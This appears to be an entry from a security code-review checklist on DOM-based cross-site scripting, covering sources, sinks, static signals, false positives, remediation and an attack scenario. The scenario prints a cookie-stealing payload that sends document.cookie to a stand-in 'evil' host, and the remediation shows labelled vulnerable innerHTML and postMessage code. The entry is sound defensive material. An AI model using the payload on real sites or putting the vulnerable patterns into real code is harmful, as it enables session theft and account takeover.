---
id: P40
name: DOMXSS
refs: ASVS V5.3.x / WSTG-CLNT-02 / CS: DOM based XSS Prevention
---

# P40 — DOMXSS

## Preconditions

The code manipulates the DOM in a browser.


## Overview
DOM-based Cross-Site Scripting (XSS) is a purely client-side flaw: untrusted data never touches the server, yet still reaches a dangerous **sink** in the browser. The source is a DOM property that the attacker can influence without the page being re-rendered by the server — `location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name`, a `postMessage`, `localStorage`/`sessionStorage`, or any value parsed out of `location`. The root cause is the same as other XSS — untrusted data reaches a sink without context-correct handling — but server-side output encoding does **nothing** to stop it, because the payload is injected after the HTML has already been parsed. The exploit also works against pages that are entirely static or cached, so a clean server template is no proof of safety. Single-page applications, hash-routed apps, and any code reading `location`/`postMessage` are prime targets.

## What to check
- Does client-side JavaScript read an attacker-controllable source (`location.hash`, `location.search`, `document.URL`, `document.referrer`, `window.name`, `postMessage.data`, `localStorage`, `sessionStorage`, `IndexedDB`) and pass it to a sink?
- Are **sink** methods used with tainted data: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`/`document.writeln`, `eval`, `new Function`, `setTimeout(string,…)`, `setInterval(string,…)`, `element.setAttribute('href'|'onclick'|…, x)`, assignment to `element.href`/`element.src`/`element.action`, jQuery `.html()`/`$('<div>', {html: x})`/`$.globalEval`, or template literals fed into any of these?
- Is a `postMessage` handler checking `event.origin` against a strict allow-list **before** touching `event.data` or forwarding it to a sink?
- Is data from the URL fragment (`#...`) used to render widgets, tabs, search, or redirects without sanitization? Hash changes do not reach the server and bypass any server-side WAF or encoding.
- Are third-party widgets/analytics reading `location` and writing to the DOM (e.g. `_gaq.push` with `document.referrer`, chat widgets rendering shared links)?
- Is `document.write` used on a page that may be served after `DOMContentLoaded` (which blows away the whole document), or in an HTTPS page where it can trigger mixed-content warnings?
- For SPAs, does the router pass path/query parameters into `innerHTML`/`v-html`/`dangerouslySetInnerHTML` during client-side navigation?

## Static signals
Direct source-to-sink flows (search across client bundles, `.ts`/`.tsx`, `.js`, `.jsx`, `.vue`, `.svelte`, `.html` `<script>` blocks):
- `el.innerHTML = location.hash.slice(1)`
- `el.innerHTML = new URLSearchParams(location.search).get('q')`
- `document.write(location.hash)`
- `eval(document.referrer)`, `new Function(payload)()`
- `setTimeout('run(' + hash + ')', 0)`, `setInterval(str, 1000)`
- `a.href = location.hash.slice(1)` // `javascript:` URL breakout
- `el.setAttribute('onclick', msg)` / `el.outerHTML = data`
- `$(container).html(location.hash)`, `$('<b>').html(ref)`, `$.globalEval(data)`
- React: `dangerouslySetInnerHTML={{ __html: hash }}`
- Vue: `v-html="hash"`, `this.$el.innerHTML = location.hash`
- Svelte: `{@html hash}`
- Angular: `[innerHTML]="hash"` (bypasses default sanitization when paired with `DomSanitizer.bypassSecurityTrustHtml`)
- `DomSanitizer.bypassSecurityTrustHtml|Url|Script|Style|ResourceUrl(...)`

`postMessage` without origin validation flowing to a sink:
- `window.addEventListener('message', e => { el.innerHTML = e.data; })` // no `e.origin` check
- `if (e.origin.includes('example.com'))` // substring check, bypassable with `evil-example.com`

## False positives
- The value is rendered via `textContent` / `innerText` / `nodeValue` (these set text, not parsed markup — no sink).
- The value is set as a DOM attribute via `setAttribute` to a **non-event, non-URL** attribute (e.g. `class`, `data-id`) and never reaches `href`/`src`/`action`/event-handler context — but verify it cannot break out of the attribute.
- The `postMessage` handler strictly validates `event.origin` against an exact allow-list (`===`, not substring/regex-without-anchors) and treats `event.data` as inert, or only passes it to `textContent`.
- Input was reduced to an allow-list (UUID, integer, boolean) before reaching the sink.
- The sink receives only server-generated, trusted HTML already sanitized by DOMPurify on the server side.
- Static analysis cannot see front-end assets (bundled/minified, no source maps). State this limitation explicitly rather than reporting a false negative as "clean".

## Attack scenario
1. Attacker crafts a URL whose fragment carries the payload: `https://app.example.com/dashboard#<img src=x onerror=fetch('//evil/?c='+document.cookie)>`.
2. Victim (an authenticated admin) clicks the link. The server returns the normal cached HTML; no server code ever sees the `#...` portion.
3. The SPA router reads `location.hash`, splits it, and assigns it to `el.innerHTML` to render a "deep-linked" widget tab.
4. The browser parses the `<img>` tag, the `onerror` fires, and the attacker exfiltrates the session cookie / reads the victim's DOM and `localStorage`.
5. Alternatively, a malicious parent page `postMessage`s a payload to a cross-origin iframe that fails to check `event.origin`, achieving the same execution from a completely different origin.

## Impact
- **Confidentiality**: theft of session tokens, `localStorage` secrets, and any DOM-rendered PII; full read of the victim's page content.
- **Integrity**: arbitrary script execution in the victim's authenticated context — account takeover, fraudulent transactions, forced enrollment of MFA devices.
- **Availability**: page defacement, forced redirect to credential-harvesting or malware pages, denial of service by destroying the DOM.
- Severity scales with the victim's privileges; a DOM XSS in an admin console or a page handling payments can mean full application compromise. CSP without `unsafe-inline` mitigation can reduce, but not eliminate, impact.

## Remediation
Treat every DOM source as untrusted; insert text, not markup. For HTML you must render, sanitize with DOMPurify and keep CSP tight.
```ts
// VULNERABLE — hash flows straight into an HTML sink
const q = new URLSearchParams(location.search).get('q');
el.innerHTML = q;                       // parsed as markup → script executes

// VULNERABLE — postMessage with no origin check
window.addEventListener('message', e => { el.innerHTML = e.data; });

// SAFE — render as text (no parsing), or sanitize explicitly
el.textContent = q;                     // text only, never parsed
el.innerHTML = DOMPurify.sanitize(q);   // only when rich HTML is truly required

// SAFE — strict origin allow-list before touching postMessage data
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://partner.example.com') return;
  el.textContent = e.data;              // still insert as text
});
```
Defense-in-depth: enforce a strict Content Security Policy (`script-src 'self' 'nonce-...'` / hashes, no `unsafe-inline`), enable Trusted Types (`require-trusted-types-for 'script'`) so that string-to-sink assignments throw at runtime, and treat `javascript:` URLs as blocked schemes when assigning to `href`/`src`.

## References
- OWASP ASVS V5.3.x — Output encoding and injection prevention (client-side controls)
- OWASP WSTG-CLNT-02 — Testing for DOM-based Cross Site Scripting
- OWASP Cheat Sheets: DOM based XSS Prevention, Cross Site Scripting Prevention, Content Security Policy, Third-Party JavaScript Management
